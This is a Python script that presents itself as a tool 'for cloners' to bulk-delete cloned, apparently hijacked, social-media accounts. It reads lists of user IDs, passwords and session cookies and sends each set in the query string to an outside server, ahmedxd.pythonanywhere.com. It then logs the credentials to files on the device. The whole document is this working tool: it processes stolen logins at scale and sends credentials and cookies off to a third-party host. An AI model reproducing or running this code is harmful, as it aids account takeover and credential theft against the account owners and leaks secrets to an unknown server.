"""
echo "Written by Ahmed Ali"

"""

import os
import sys
import base64
import requests

class AccountDeleter:
    def __init__(self):
        self.RED = "\033[91;1m"
        self.GREEN = "\033[92;1m"
        self.YELLOW = "\033[93;1m"
        self.WHITE = "\033[97;1m"
        self.successful = []
        self.fail = []

    def divider(self):
        print(f'{self.WHITE}-'*54)

    def DELETE(self, uid, password, cookie):
        if "sb" not in cookie:
            cookie = f'sb={base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")};'+cookie
        params = {
            "uid": uid,
            "password": password,
            "cookie": cookie
        }
        response = requests.get("https://ahmedxd.pythonanywhere.com/DELETE", params=params)
        if "DELETE" in response.text:
            self.successful.append(uid)
            print(self.GREEN + response.text)
            open("/sdcard/delete_idz.txt","a").write(f"{uid}|{password}|{cookie}\n")
        elif "FAIL" in response.text:
            self.fail.append(uid)
            print(self.RED + response.text)
            open("/sdcard/fail_deleting_idz.txt","a").write(f"{uid}|{password}|{cookie}\n")
        else:
            self.fail.append(uid)
            print(self.YELLOW + response.text)
            if "[PS_WRONG]" in response.text:
                open("/sdcard/wrong_pass_idz.txt","a").write(f"{uid}|{password}|{cookie}\n")
            else:
                open("/sdcard/cookies_lol_idz.txt","a").write(f"{uid}|{password}|{cookie}\n")

    def main(self):
        self.divider()
        print(f"{self.GREEN}This tool is created by Ahmed Ali")
        print(f"{self.YELLOW}This tool is made for cloners to automaticly delete their cloned account. In file idz must be in uid|pass|cookie format")
        print(f"{self.GREEN}Delete idz will be saved in /sdcard/delete_idz.txt")
        print(f"{self.RED}Failed to delete idz will be saved in /sdcard/fail_deleting_idz.txt")
        self.divider()

        information_file = input(f"{self.WHITE}In File ids should be in this format: uid|pass|cookie \nEnter File: ")
        try:
            id_dic = open(information_file, 'r').read().splitlines()
        except FileNotFoundError:
            sys.exit(f"{self.RED}File not found")

        self.divider()

        for element in id_dic:
            if element == "":
                break
            try:
                uid, password, cookie = element.split("|")
            except ValueError:
                self.divider()
                print(f"{self.YELLOW}[WRONG FORMAT] " + element)
                self.divider()
                with open("/sdcard/wrong_format.txt", 'a') as f:
                    f.write(element + '\n')
                continue
            self.DELETE(uid=uid, password=password, cookie=cookie)

        self.divider()
        print(f"{self.WHITE}Total ID: {len(id_dic)}\nTotal Delete ID: {self.GREEN}{len(self.successful)}\n{self.WHITE}Total Failed: {self.RED}{len(self.fail)}{self.WHITE}")

if __name__ == "__main__":
    AccountDeleter().main()
